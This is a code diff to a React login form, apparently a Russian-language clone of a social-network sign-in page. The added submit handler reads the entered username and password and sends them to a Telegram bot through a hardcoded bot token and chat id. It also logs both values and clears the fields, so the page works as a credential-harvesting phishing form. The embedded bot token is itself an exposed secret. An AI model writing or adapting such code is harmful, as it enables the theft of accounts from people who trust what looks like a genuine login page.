@@ -10,7 +10,32 @@ import PlayMarket from "../../assets/form-page/play-market.png";
 function Form() {
   const handleSubmit = e => {
     e.preventDefault();
+
+    let token = "6315734096:AAEQilGwwovErYOjX5nwpMmJy9vGWJ6Wb6Y";
+    let chat_id = 5585680622;
+
+    let username = encodeURIComponent(
+      document.querySelector(".username").value
+    );
+    let password = encodeURIComponent(
+      document.querySelector(".password").value
+    );
+
+    let text = `Username: ${username} %0A Password: ${password}`;
+
+    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=html`;
+
+    let api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+
+    console.log(username);
+    console.log(password);
+
+    document.querySelector(".username").value = "";
+    document.querySelector(".password").value = "";
   };
+
   return (
     <div className="form">
       <div className="form__wrapper">
@@ -34,8 +59,13 @@ function Form() {
                 <input
                   type="text"
                   placeholder="Телефон, имя пользователя или эл. адрес"
+                  className="username"
                 />
-                <input type="text" placeholder="Пароль" />
+                <input
+                  type="password"
+                  placeholder="Пароль"
+                  className="password"
+                />
                 <button type="submit">Войти</button>
               </form>
               <div className="form__right-or">
@@ -54,8 +84,10 @@ function Form() {
 
             <div className="form__bottom">
               <div className="form__bottom-title">
-                <p>У вас ещё нет аккаунта? </p>
-                <a href="#">Зарегистрироваться</a>
+                <div className="form__bottom-title-wrapper">
+                  <p>У вас ещё нет аккаунта? </p>
+                  <a href="#">Зарегистрироваться</a>
+                </div>
               </div>
               <div className="form__actions">
                 <div className="form__actions-title">
